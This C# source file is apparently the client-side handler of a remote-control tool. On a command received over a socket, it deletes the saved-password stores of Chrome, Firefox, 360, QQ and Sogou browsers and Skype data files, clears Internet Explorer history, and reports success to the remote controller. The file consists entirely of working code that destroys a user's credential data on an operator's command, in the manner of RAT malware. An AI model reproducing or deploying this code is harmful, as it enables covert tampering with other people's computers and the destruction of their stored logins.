using System;
using System.IO;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestClearBrowserDataHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    var req = reqObj as RequestClearBrowserData;
                    if (req == null) return;

                    switch (req.BrowserType)
                    {
                        case eBrowserType.IE:
                            ProcessUtil.Run("RunDll32.exe", "InetCpl.cpl,ClearMyTracksByProcess 255", true);
                            break;
                        case eBrowserType.Chrome:
                            string chromePath = Path.Combine(
                                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                @"Google\Chrome\User Data\Default\Login Data");
                            if (File.Exists(chromePath)) File.Delete(chromePath);
                            break;
                        case eBrowserType.Firefox:
                            string ffDir = Path.Combine(
                                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                                @"Mozilla\Firefox\Profiles");
                            if (Directory.Exists(ffDir))
                            {
                                foreach (var dir in Directory.GetDirectories(ffDir))
                                {
                                    string loginsFile = Path.Combine(dir, "logins.json");
                                    if (File.Exists(loginsFile)) File.Delete(loginsFile);
                                }
                            }
                            break;
                        case eBrowserType.Skype:
                            string skypeDir = Path.Combine(
                                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Skype");
                            if (Directory.Exists(skypeDir))
                            {
                                foreach (var f in Directory.GetFiles(skypeDir, "*.xml", SearchOption.AllDirectories))
                                    File.Delete(f);
                            }
                            break;
                        case eBrowserType.Browser360:
                            string b360Path = Path.Combine(
                                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                @"360Chrome\Chrome\User Data\Default\Login Data");
                            if (File.Exists(b360Path)) File.Delete(b360Path);
                            break;
                        case eBrowserType.QQ:
                            string qqPath = Path.Combine(
                                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                @"Tencent\QQBrowser\User Data\Default\Login Data");
                            if (File.Exists(qqPath)) File.Delete(qqPath);
                            break;
                        case eBrowserType.Sogou:
                            string sgPath = Path.Combine(
                                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                                @"SogouExplorer\User Data\Default\Login Data");
                            if (File.Exists(sgPath)) File.Delete(sgPath);
                            break;
                    }

                    var resp = new ResponseClearBrowserData();
                    resp.Result = true;
                    resp.Message = "清除完成";
                    session.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_RESPONSE, resp);
                }
                catch (Exception ex)
                {
                    var resp = new ResponseClearBrowserData();
                    resp.Result = false;
                    resp.Message = ex.Message;
                    session.Send(ePacketType.PACKET_CLEAR_BROWSER_DATA_RESPONSE, resp);
                }
            });
        }
    }
}
